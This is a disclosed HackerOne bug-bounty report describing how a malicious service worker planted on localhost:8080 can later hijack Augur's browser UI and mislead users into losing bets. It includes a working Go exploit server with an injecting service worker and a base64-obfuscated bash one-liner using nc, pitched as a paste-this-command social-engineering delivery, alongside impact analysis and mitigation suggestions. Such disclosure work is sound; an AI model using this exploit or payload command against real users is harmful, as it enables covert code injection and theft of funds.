@@ -1,0 +1,196 @@
+ReportLink:https://hackerone.com/reports/380594
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/karalabe
+ReportedTo:Augur(augurproject)
+BountyAmount:1000.0
+Severity:low
+State:Closed
+DateOfDisclosure:31.07.2018 17:02:58
+
+Summary:
+
+## Augur UI hijack via dormant service workers
+
+![tldr](pwned.png)
+
+#### Augur background
+
+The architecture of Augur currently consist of 3 individual layers:
+
+ * At the lowest level, Augur consists of a batch of smart contracts built on top of Ethereum. This level is enforced by a global blockchain and can be accessed via gateway nodes operated either by the user or by a trusted remote entity.
+ * At the middle level, Augur consists of an intermediate service layer that uses the (trusted) Ethereum gateway as its data source, builds a database out of the contract logs, serving the pre-prepared data for a web based UI.
+ * At the highest level, Augur consists of a web UI served by the trusted Augur node, displayed by- and interacted through the **user's own local browser** through `http://localhost:8080`.
+
+This report assumes that the Ethereum network, Ethereum gateway and Augur gateway can all be trusted and operate correctly. The report attacks the last link in the chain, the user's browser, causing arbitrary code to be injected in Augur's UI.
+
+#### Service workers background
+
+> A service worker is a script that your browser runs in the background, separate from a web page, opening the door to features that don't need a web page or user interaction. The core feature is the ability to intercept and handle network requests. ~ Google Developers
+
+To expand a bit on the above short summary, service workers is a technology supported by all modern web browsers, permitting a website to register an arbitrary JavaScript to run as a background thread beneath a website. The primary goal is to allow offline caching, where the service worker can hijack network requests and can service them (including making arbitrary modifications to them). This enables such a JavaScript code to act as a temporary server when the user doesn't have an internet connection.
+
+For a full rundown on the technology we refer the reader to [Google's developer page](https://developers.google.com/web/fundamentals/primers/service-workers/), but the interesting aspects from the point of view of this vulnerability report (beyond the core functionality of hijacking network requests) is the life cycle of service workers and their threat model:
+
+ * A website can install a service worker at an arbitrary point in time. **That service worker remains in effect and executing until it is explicitly unregistered!** Service workers survive page refreshes, full forced uncached refreshes and even browser restarts. Service workers are **not tied** to the served content, a previously registered service worked will be active even for completely new, unrelated content.
+ * Since service workers are from all intents and purposes **by-design** MITM attacks, they have a strict security policy of only running from HTTPS (ensuring that a website can only ever register code that hijacks its own content), and only running for the exact same **origin** they were registered from. **Localhost is an exception from the strict security policy to permit easy development.**
+
+ I think you already have an idea where this is going...
+
+#### Exploit explained
+
+The attack described in this document consists of abusing all modern browser's service worker security policy coupled with Augur's architectural design of running the UI in the user's browser to seamlessly hijack all Augur communication and also seamlessly inject arbitrary code into Augur's UI:
+
+ * Augur's UI is running from `http://localhost:8080`, which is unauthenticated from an SSL perspective. Code from different sessions cannot be proven to belong (or not belong) to the same (or different) applications.
+ * Browsers consider `localhost` as development environments, so they permit installing and executing service workers without SSL authentications.
+ * Service workers will forever lay dormant in the browser (no cache control, no way to pre-detect) and will execute every time the same origin is loaded (`http://localhost:8080`).
+
+**Payload delivery**
+
+In order to hijack Augur however, we need to install a service worker to `localhost:8080` in the first place. This requires running a malicious webserver **at least once** on the target machine and loading `http://localhost:8080` at least once in the user's web browser prior to Augur.
+
+Before getting into how easy or hard this might be, lets demo an explicitly obvious way to do it to explain the attack better. Consider the following **fully working and fully self contained exploit** from Go:
+
+
+```go
+package main
+
+import (
+	"fmt"
+	"net/http"
+)
+
+func main() {
+	// Start a web-server on port 8080, serving the demo HTML and JS injector
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, index)
+	})
+	http.HandleFunc("/pwner.js", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/javascript")
+		fmt.Fprint(w, pwner)
+	})
+	http.ListenAndServe(":8080", nil)
+}
+
+var index = `
+<html>
+
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/pwner.js')
+  .then(function(registration) {
+    console.log('Registration successful, scope is:', registration.scope);
+  })
+  .catch(function(error) {
+    console.log('Service worker registration failed, error:', error);
+  });
+}
+</script>
+
+<img id='gopher'/>
+<script>
+	setTimeout(function() {
+		document.getElementById('gopher').src = 'https://gophercises.com/img/gophercises_jumping.gif';
+	}, 1000)
+</script>
+</html>
+`
+
+var pwner = `
+// Inject ourselves as the base service worker for Augur
+self.addEventListener('install', function(event) {
+  console.log('Service worker installing...');
+  self.skipWaiting();
+});
+
+self.addEventListener('activate', function(event) {
+  console.log('Service worker activating...');
+	clients.claim();
+});
+
+// Hijack and HTTP requests, we're looking for script loads
+self.addEventListener('fetch', function(event) {
+  console.log('Fetching:', event.request.url);
+  if (event.request.url.startsWith("http://localhost:8080/main.")) {
+    // Main Augur application is loading, inject our custom script into it
+    event.respondWith(fetch(event.request.url)
+    .then(function(response) {
+      return response.text();
+    })
+    .then(function(text) {
+      return new Response(text + '\nsetTimeout(function() { alert("You are Pwned!") }, 3000);');
+    }));
+  }
+});
+`
+```
+
+What this code does in short is:
+
+ * Start a Go web server, serving two endpoints: `/` for the index and `/pwner.js` for the hijacking service worker.
+ * The `index.html` page consists of a tiny script that registers `/pwner.js` as a service worker. It also displays a jumping gopher for the fun of it.
+ * The `/pwner.js` service worker is a simple script that hijacks all network requests, prints a log for each, and if it encounders a request to `main.js` (augur's code), it injects some arbitrary JavaScript at the end.
+
+We can run the above code via `go run exploit.go` (or whatever the name of the file is you saved it into), and load the page from a web browser. It will display a gopher, nothing else. If you check the JavaScript console however, you should see something along the lines of:
+
+```
+Registration successful, scope is: http://localhost:8080/
+pwner.js:4 Service worker installing...
+pwner.js:9 Service worker activating...
+pwner.js:15 Fetching: https://gophercises.com/img/gophercises_jumping.gif
+```
+
+At this point you can terminate the Go attacker server and you can close your browser. The hijacker script has been successfully injected to intercept anything on the `localhost:8080` origin.
+
+**Payload execution**
+
+Time passes (arbitrary much, we don't even care) and the user eventually downloads and starts Augur from the official repository and/or client. This will start the Augur App, sync the local database from the Ethereum network. When sync is done, the user pushes the `Open Augur App` button, loading the Augur UI from the app in the user's browser.
+
+At this point our previously dormant service worker starts executing, hijacking all network fetches between the UI and the backend service. This permits us to arbitrarily modify the data flow between the user and the service and also permits us to inject arbitrary JavaScript code into the UI itself.
+
+You can see this via the JavaScript alert injected which displays **"You are Pwned!"**.
+
+#### Exploit impact
+
+The impact of the exploit is actually quite significant. By having full control over the network traffic between the UI and the backend server; and also having full control over the UI contents, an attacker can display arbitrary Augur markets, shares, stats, etc.
+
+The attacker **does not** have direct control over user funds, and the attacker **cannot** directly get the user to sign junk transactions. However by modifying the market descriptions and stats, the attacker **can** convince the user to place losing bets (e.g. invert the winning condition), causing loss of funds. The attacker can further place counter bets on the hijacked market, causing a direct gain of funds to themselves.
+
+From a technical perspective, the reason the exploit can be considered of a significant impact is because it **doesn't require elevated permissions** to run, after running a single time it **remains dormant forever** in the user's system and it's a **fully legitimate browser functionality**, so no exploit detection software can ever catch it.
+
+#### Exploit delivery
+
+The hard part of the exploit however is delivering it to the end user in the first place. As explained above, browsers do enforce Same-Origin security policies against service workers, so the only way to attack Augur on the user's machine is to have the user load a malicious page from `localhost:8080` served by themselves.
+
+The Go code above is a nice demo for this, but it's obviously not a realistic scenario. We need better social engineering attacks to deliver the exploit to the user's system.
+
+**Bash command**
+
+One prevalent way nowadays to attack crypto-currency users is to get them to copy paste code from random web pages or chats into their terminal. While it may sound overly dumb, it does seem to work, especially since this particular attack doesn't even require root access. 
+
+The following 791 character bash command will do a full hijack injection including serving up 2 different webpages and automatically pointing the user's browser to load them and register the service worker.
+
+```bash
+echo SFRUUC8xLjEgMjAwIE9LDQoNCjxzY3JpcHQ+bmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoJycpPC9zY3JpcHQ+ | base64 -d | nc -lN 8080 > /dev/null && echo SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvamF2YXNjcmlwdA0KDQpzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImluc3RhbGwiLGZ1bmN0aW9uKGV2ZW50KXtzZWxmLnNraXBXYWl0aW5nKCl9KTtzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImZldGNoIixmdW5jdGlvbihldmVudCl7aWYoZXZlbnQucmVxdWVzdC51cmwuc3RhcnRzV2l0aCgiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21haW4uIikpe2V2ZW50LnJlc3BvbmRXaXRoKGZldGNoKGV2ZW50LnJlcXVlc3QudXJsKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKXtyZXR1cm4gcmVzcG9uc2UudGV4dCgpfSkudGhlbihmdW5jdGlvbih0ZXh0KXtyZXR1cm4gbmV3IFJlc3BvbnNlKHRleHQrYApzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7YWxlcnQoIllvdSBhcmUgUHduZWQhIil9LDMwMDApYCl9KSl9fSkK | base64 -d | nc -lN 8080 > /dev/null & xdg-open http://localhost:8080
+```
+
+Whilst it may look a bit innocuous, an attacker could easily hide this in a larger script that actually does something useful. Since the exploit injection doesn't **do** anything immediate, a vulnerable user will be oblivious of the dormant exploit on his machine waiting to execute.
+
+**Hijack 8080 services**
+
+Port `8080` on `localhost` is the de facto standard port for running just about any web service. Web developers are used to running their development code on it. Many services, monitoring tools, etc like to run on some variation of `8080`. This means hijacking port `8080` on developer machines has an elevated probability, since it only requires a few lines in any web dependency, which need to execute a single time, can be deleted afterwards without trace.
+
+Although developers will probably be reluctant to run arbitrary code on their machine (although lets be honest, we all ran **that awesome script** from GitHub for whatever reason), this exploit is particularly nasty as it runs in a fully sandboxed environment (user's browser), so noone expects that a single page load can leave arbitrary armed code behind.
+
+#### Suggestions
+
+At the very core, it seems that running the Augur UI in the user's browser from `localhost` might not have been the most enlightened decision due to `origin` clashes. Browsers always treat `localhost` as a special snowflake when it comes to security policies and I can imagine plenty of future vulnerabilities might originate from this. If Augur is relying on Electron for a lot of its functinality, it might make sense to ship the entire browser with Augur too and to have a dedicated process solely for Augur. That would prevent old browser sessions leaking malicious scripts into new ones.
+
+Running on port `8080` is again a less fortunate decision, since `origin` wise it clashes with just too many other providers and also clashes with developer's default choice. Running on some weird port number should not have any impact on user experience, but should make it a lot harder to deliver an exploit on that particular port opposed to the common 8080.
+
+## Impact
+
+The impact of the exploit is actually quite significant. By having full control over the network traffic between the UI and the backend server; and also having full control over the UI contents, an attacker can display arbitrary Augur markets, shares, stats, etc.
+
+The attacker **does not** have direct control over user funds, and the attacker **cannot** directly get the user to sign junk transactions. However by modifying the market descriptions and stats, the attacker **can** convince the user to place losing bets (e.g. invert the winning condition), causing loss of funds. The attacker can further place counter bets on the hijacked market, causing a direct gain of funds to themselves.
+
+From a technical perspective, the reason the exploit can be considered of a significant impact is because it **doesn't require elevated permissions** to run, after running a single time it **remains dormant forever** in the user's system and it's a **fully legitimate browser functionality**, so no exploit detection software can ever catch it.
